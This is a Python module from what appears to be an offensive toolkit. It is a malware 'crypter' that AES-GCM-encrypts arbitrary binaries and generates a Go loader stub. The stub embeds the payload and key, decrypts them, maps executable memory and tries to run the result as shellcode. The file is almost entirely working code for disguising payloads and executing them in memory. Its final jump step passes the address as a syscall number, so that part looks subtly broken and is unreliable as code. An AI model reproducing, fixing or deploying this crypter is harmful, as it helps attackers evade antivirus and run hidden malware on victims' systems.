"""
arsenal/crypter.py
──────────────────
AES-GCM Crypter y generador de Loaders polimórficos.
"""

import base64
import logging
import os
from pathlib import Path
from typing import Optional

log = logging.getLogger("argos.arsenal.crypter")

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    log.warning("[Crypter] Librería 'cryptography' no disponible. Crypter desactivado.")


class AESCrypter:
    """
    Cifra binarios completos utilizando AES-256 GCM.
    Genera además un 'loader' stub en Go para descifrar y ejecutar en memoria.
    """

    def __init__(self):
        # En producción, esto debería generarse dinámicamente por misión.
        self.key = AESGCM.generate_key(bit_length=256)

    def encrypt_file(self, file_path: Path) -> Optional[bytes]:
        """Cifra un archivo y devuelve los bytes cifrados, o None si hay error."""
        if not CRYPTO_AVAILABLE:
            return None

        try:
            with open(file_path, "rb") as f:
                data = f.read()

            aesgcm = AESGCM(self.key)
            nonce = os.urandom(12)
            ciphertext = aesgcm.encrypt(nonce, data, None)

            # Empaquetamos nonce + ciphertext juntos
            return nonce + ciphertext

        except Exception as exc:
            log.error(f"[Crypter] Error cifrando {file_path}: {exc}")
            return None

    def generate_go_loader(self, encrypted_bytes: bytes, output_path: Path) -> bool:
        """
        Genera un stub en Go que tiene el payload cifrado embebido y lo ejecuta 
        (ej. mediante RunPE o syscalls directas, según el objetivo).
        """
        b64_payload = base64.b64encode(encrypted_bytes).decode("ascii")
        b64_key = base64.b64encode(self.key).decode("ascii")

        stub = f"""package main

import (
\t"crypto/aes"
\t"crypto/cipher"
\t"encoding/base64"
\t"fmt"
\t"os"
\t"runtime"
\t"syscall"
\t"unsafe"
)

var p = "{b64_payload}"
var k = "{b64_key}"

func main() {{
\t// Decode payload and key
\tpayloadBytes, _ := base64.StdEncoding.DecodeString(p)
\tkeyBytes, _ := base64.StdEncoding.DecodeString(k)

\tif len(payloadBytes) < 12 {{
\t\tos.Exit(1)
\t}}

\t// Extract nonce
\tnonce := payloadBytes[:12]
\tciphertext := payloadBytes[12:]

\t// Decrypt
\tblock, err := aes.NewCipher(keyBytes)
\tif err != nil {{
\t\tos.Exit(1)
\t}}

\taesgcm, err := cipher.NewGCM(block)
\tif err != nil {{
\t\tos.Exit(1)
\t}}

\tplaintext, err := aesgcm.Open(nil, nonce, ciphertext, nil)
\tif err != nil {{
\t\tos.Exit(1)
\t}}

	// Decrypt and execute in memory (Phase 4)
	// Shellcode execution for Linux/MacOS via mmap + mprotect
	if runtime.GOARCH == "amd64" || runtime.GOARCH == "arm64" {{
		execMem(plaintext)
	}}
	fmt.Printf("[Loader] Decrypted %d bytes successfully.\\n", len(plaintext))
}}

func execMem(data []byte) {{
	// Allocate executable memory region
	addr, _, err := syscall.Syscall6(
		syscall.SYS_MMAP, 0, uintptr(len(data)),
		syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,
		syscall.MAP_PRIVATE|syscall.MAP_ANONYMOUS, ^uintptr(0), 0,
	)
	if err != 0 {{
		os.Exit(1)
	}}
	// Copy shellcode to memory
	copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:len(data)], data)
	// Jump to shellcode
	syscall.Syscall(addr, 0, 0, 0, 0)
}}
"""
        try:
            with open(output_path, "w", encoding="utf-8") as f:
                f.write(stub)
            return True
        except Exception as exc:
            log.error(f"[Crypter] Error escribiendo el loader en {output_path}: {exc}")
            return False
